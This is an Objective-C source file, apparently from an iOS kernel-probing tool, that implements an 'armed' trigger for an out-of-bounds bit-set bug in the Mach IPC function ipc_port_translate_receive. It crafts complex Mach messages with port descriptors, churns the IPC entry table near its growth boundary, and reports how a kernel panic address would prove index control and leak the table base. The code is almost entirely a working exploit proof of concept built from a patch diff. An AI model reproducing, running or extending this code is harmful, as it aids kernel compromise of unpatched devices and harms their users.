#import "KPAuditIPCModule.h"
#import <UIKit/UIKit.h>
#import "KPLog.h"
#import <mach/mach.h>
#import <mach/message.h>

@interface KPAuditIPCModule ()
@property (nonatomic, copy) NSString *identifier;
@property (nonatomic, copy) NSString *title;
@property (nonatomic, copy) NSString *subtitle;
@property (nonatomic, copy) NSString *icon;
@property (nonatomic, assign) KPTestSection section;
@end

@implementation KPAuditIPCModule

- (instancetype)initWithNameSweep {
    self = [super init];
    if (self) {
        _identifier = @"ipc112514.translate.armed";
        _title = @"Mach IPC translate-receive (armed)";
        _subtitle = @"index OOB bit-set: send+recv port descriptors + itable churn at growth boundary";
        _icon = @"arrow.left.arrow.right.circle";
        _section = KPTestSectionKernelProbes;
    }
    return self;
}

- (void)journal:(NSString *)line {
    NSString *path = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES).firstObject
                      stringByAppendingPathComponent:@"kp-ipc-journal.log"];
    NSFileHandle *fh = [NSFileHandle fileHandleForWritingAtPath:path];
    if (!fh) {
        [[NSFileManager defaultManager] createFileAtPath:path contents:nil attributes:nil];
        fh = [NSFileHandle fileHandleForWritingAtPath:path];
    }
    [fh seekToEndOfFile];
    [fh writeData:[[line stringByAppendingString:@"\n"] dataUsingEncoding:NSUTF8StringEncoding]];
    [fh synchronizeFile];
    [fh closeFile];
    [KPLog.shared appendFormat:@"[ipc] %@", line];
}

// Send one message with `count` COPY_SEND port descriptors (all referencing the
// same local send right), then RECEIVE it back — the receive is what actually
// runs ipc_port_translate_receive (the vulnerable function).
- (NSDictionary *)sendReceiveCount:(uint32_t)count port:(mach_port_t)port sendRight:(mach_port_t)sendRight {
    NSMutableDictionary *result = [NSMutableDictionary dictionary];
    size_t descBytes = (size_t)count * 16;
    size_t total = sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t) + descBytes;
    uint8_t *buf = calloc(1, total);
    if (!buf) {
        result[@"status"] = @"CALLOC_FAILED";
        return result;
    }

    mach_msg_header_t *hdr = (mach_msg_header_t *)buf;
    hdr->msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
    hdr->msgh_size = (mach_msg_size_t)total;
    hdr->msgh_remote_port = port;
    hdr->msgh_local_port = MACH_PORT_NULL;
    hdr->msgh_id = 0x4b50;

    mach_msg_body_t *body = (mach_msg_body_t *)(buf + sizeof(mach_msg_header_t));
    body->msgh_descriptor_count = count;

    uint8_t *descBase = buf + sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t);
    for (uint32_t i = 0; i < count; i++) {
        mach_msg_port_descriptor_t *pd = (mach_msg_port_descriptor_t *)(descBase + i * 16);
        pd->name = (void *)(uintptr_t)sendRight;
        pd->disposition = MACH_MSG_TYPE_COPY_SEND;
        pd->type = MACH_MSG_PORT_DESCRIPTOR;
    }

    kern_return_t kr = mach_msg((mach_msg_header_t *)buf, MACH_SEND_MSG,
                                0, (mach_msg_size_t)total,
                                port, 1, MACH_PORT_NULL);
    result[@"send_kr"] = @(kr);
    if (kr != KERN_SUCCESS) {
        free(buf);
        return result;
    }

    // RECEIVE — this is where ipc_port_translate_receive runs (the OOB site).
    size_t rcvTotal = total + 64;
    uint8_t *rcv = calloc(1, rcvTotal);
    mach_msg_header_t *rh = (mach_msg_header_t *)rcv;
    rh->msgh_size = (mach_msg_size_t)rcvTotal;
    rh->msgh_local_port = port;
    kr = mach_msg(rh, MACH_RCV_MSG, 0, (mach_msg_size_t)rcvTotal,
                  port, 1, MACH_PORT_NULL);
    result[@"recv_kr"] = @(kr);
    if (kr == KERN_SUCCESS) {
        mach_msg_body_t *rb = (mach_msg_body_t *)(rcv + sizeof(mach_msg_header_t));
        result[@"recv_desc_count"] = @(rb->msgh_descriptor_count);
    }
    free(rcv);
    free(buf);
    return result;
}

// Churn the ipc entry table: allocate many rights then free every other one —
// the fix also touched ipc_entry_grow_table, so the bug lives near a table
// growth/free boundary.
- (void)churnItableWithPorts:(NSMutableArray *)held count:(int)count {
    for (int i = 0; i < count; i++) {
        mach_port_t p = MACH_PORT_NULL;
        kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &p);
        if (kr == KERN_SUCCESS) {
            [held addObject:@(p)];
            if (held.count > 4096) {
                mach_port_t old = (mach_port_t)[held.firstObject unsignedIntValue];
                [held removeObjectAtIndex:0];
                mach_port_destroy(mach_task_self(), old);
            }
        }
    }
}

#pragma mark - Report

- (NSString *)runReport {
    NSMutableString *report = [NSMutableString string];
    [report appendString:@"=== KexProofV4 · IPC translate_receive index OOB ===\n"];
    [report appendString:@"Fix-diff RE: 27.0.1 has NO bounds check on the 16-byte-stride table\n"];
    [report appendString:@"index (w2) in ipc_port_translate_receive; 27.2 adds cmp index, capacity.\n"];
    [report appendString:@"Vuln: read table[w2], set bit 1, write back = OOB bit-set at +16*index.\n"];
    [report appendString:@"Note: translate_receive runs at RECEIVE time, so the probe sends AND\n"];
    [report appendString:@"receives; the itable churn probes the ipc_entry_grow_table boundary\n"];
    [report appendString:@"(the second changed function in the same fix).\n"];
    [report appendString:@"Oracle: panic far = base + 16*index (index control + table base leak).\n"];
    [report appendFormat:@"Target: iOS %@ uid=%d\n", UIDevice.currentDevice.systemVersion, getuid()];

    mach_port_t port = MACH_PORT_NULL;
    kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
    [report appendFormat:@"port allocate kr=%d port=%u\n", kr, port];
    if (kr != KERN_SUCCESS) {
        [report appendString:@"\nVERDICT: PORT_ALLOCATE_FAILED\n"];
        return report;
    }
    mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);

    NSMutableArray *held = [NSMutableArray array];
    [self churnItableWithPorts:held count:512];
    [self journal:[NSString stringWithFormat:@"CHURN_BASE held=%d", (int)held.count]];

    [report appendString:@"\n--- descriptor-count sweep (send+recv) ---\n"];
    uint32_t counts[] = {1, 2, 4, 8, 16, 32, 64, 128};
    for (size_t i = 0; i < sizeof(counts)/sizeof(counts[0]); i++) {
        NSDictionary *r = [self sendReceiveCount:counts[i] port:port sendRight:port];
        [report appendFormat:@"count=%u -> %@\n", counts[i], r];
        [self journal:[NSString stringWithFormat:@"sweep count=%u %@", counts[i], r]];
    }

    [report appendString:@"\n--- itable churn + burst (growth boundary) ---\n"];
    for (int round = 0; round < 8; round++) {
        [self churnItableWithPorts:held count:256];
        for (int i = 0; i < 32; i++) {
            NSDictionary *r = [self sendReceiveCount:16 port:port sendRight:port];
            if ([r[@"recv_kr"] intValue] != 0 && [r[@"send_kr"] intValue] != 0) {
                [report appendFormat:@"round=%d burst=%d -> %@\n", round, i, r];
            }
        }
    }
    [self journal:[NSString stringWithFormat:@"CHURN_DONE held=%d", (int)held.count]];

    for (NSNumber *p in held) {
        mach_port_destroy(mach_task_self(), (mach_port_t)p.unsignedIntValue);
    }
    mach_port_deallocate(mach_task_self(), port);

    [report appendString:@"\nVERDICT: SEE_JOURNAL\n"];
    [report appendString:
     @"Survived with recv_kr=0 everywhere = the send path validated everything\n"
     @"and the receive translation never saw a bad index; the boundary angle\n"
     @"may need a real cross-process message (a mach service that accepts port\n"
     @"descriptors) or a tighter itable-window race.\n"
     @"Panic = pull the log; far = base+16*index is the leak + control proof.\n"];
    return report;
}

@end
